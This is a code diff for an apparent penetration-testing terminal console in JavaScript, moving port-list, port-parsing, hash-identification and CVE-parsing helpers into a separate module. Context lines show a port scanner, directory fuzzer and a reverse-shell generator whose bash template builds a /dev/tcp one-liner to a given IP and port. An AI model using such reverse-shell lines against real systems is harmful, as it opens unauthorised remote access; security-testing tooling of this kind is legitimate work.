@@ -28,7 +28,7 @@ const { frameDiff, diffTokens, wordHi } = require("./lib/diff"); // terminal ren
 
 // ---------- data ----------
 const SERVICES = { 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http", 110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios", 143: "imap", 161: "snmp", 389: "ldap", 443: "https", 445: "smb", 465: "smtps", 587: "smtp", 636: "ldaps", 993: "imaps", 995: "pop3s", 1433: "mssql", 1521: "oracle", 2049: "nfs", 2375: "docker", 3306: "mysql", 3389: "rdp", 4444: "metasploit", 5432: "postgres", 5601: "kibana", 5900: "vnc", 5985: "winrm", 6379: "redis", 8000: "http-alt", 8080: "http-proxy", 8443: "https-alt", 8888: "http-alt", 9200: "elastic", 11211: "memcached", 27017: "mongodb" };
-const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445, 465, 587, 636, 993, 995, 1433, 1521, 2049, 2375, 3306, 3389, 4444, 5432, 5601, 5900, 5985, 6379, 8000, 8080, 8443, 8888, 9200, 11211, 27017];
+const { TOP_PORTS, parsePorts, idHash, parseCve } = require("./lib/scanutil"); // security-console core logic (lib/scanutil.js)
 
 const SHELLS = {
   bash: (i, o) => `bash -i >& /dev/tcp/${i}/${o} 0>&1`,
@@ -129,12 +129,6 @@ function scan(host, ports, timeout = 900, conc = 250) {
     });
   });
 }
-function parsePorts(spec) {
-  if (!spec || spec === "top") return TOP_PORTS;
-  const m = spec.match(/^(\d+)-(\d+)$/);
-  if (m) { const a = []; for (let i = +m[1]; i <= +m[2]; i++) a.push(i); return a; }
-  return spec.split(",").map(Number).filter((n) => n > 0 && n < 65536);
-}
 
 // ---------- encoders / hashes ----------
 const ENC = {
@@ -146,16 +140,6 @@ const ENC = {
   urld: (s) => decodeURIComponent(s),
 };
 function hashes(s) { return ["md5", "sha1", "sha256", "sha512"].map((a) => "  " + a.padEnd(8) + cyan(crypto.createHash(a).update(s).digest("hex"))).join("\n"); }
-function idHash(h) {
-  h = h.trim();
-  if (/^\$2[aby]\$/.test(h)) return "bcrypt";
-  if (/^\$6\$/.test(h)) return "sha512crypt"; if (/^\$1\$/.test(h)) return "md5crypt";
-  if (/^[a-f0-9]{32}$/i.test(h)) return "MD5 or NTLM (-m 0 / -m 1000)";
-  if (/^[a-f0-9]{40}$/i.test(h)) return "SHA-1 (-m 100)";
-  if (/^[a-f0-9]{64}$/i.test(h)) return "SHA-256 (-m 1400)";
-  if (/^[a-f0-9]{128}$/i.test(h)) return "SHA-512 (-m 1700)";
-  return "unknown";
-}
 
 // ---------- recon: DNS / WHOIS / headers ----------
 async function dnsLookup(host) {
@@ -242,12 +226,6 @@ async function fuzz(base, wlFile) {
 }
 
 // ---------- CVE search (NVD) ----------
-function parseCve(v) {
-  const c = v.cve, desc = (c.descriptions.find((d) => d.lang === "en") || c.descriptions[0] || {}).value || "";
-  const m = c.metrics || {}, p = m.cvssMetricV31 || m.cvssMetricV30 || m.cvssMetricV2;
-  const score = p && p[0] ? p[0].cvssData.baseScore : "", sev = p && p[0] ? (p[0].cvssData.baseSeverity || p[0].baseSeverity || "") : "";
-  return { id: c.id, desc, score, sev, published: (c.published || "").slice(0, 10) };
-}
 async function cveSearch(q) {
   q = (q || "").trim();
   if (!q) { console.log("  " + red("usage: cve <keyword or CVE-id>")); return; }
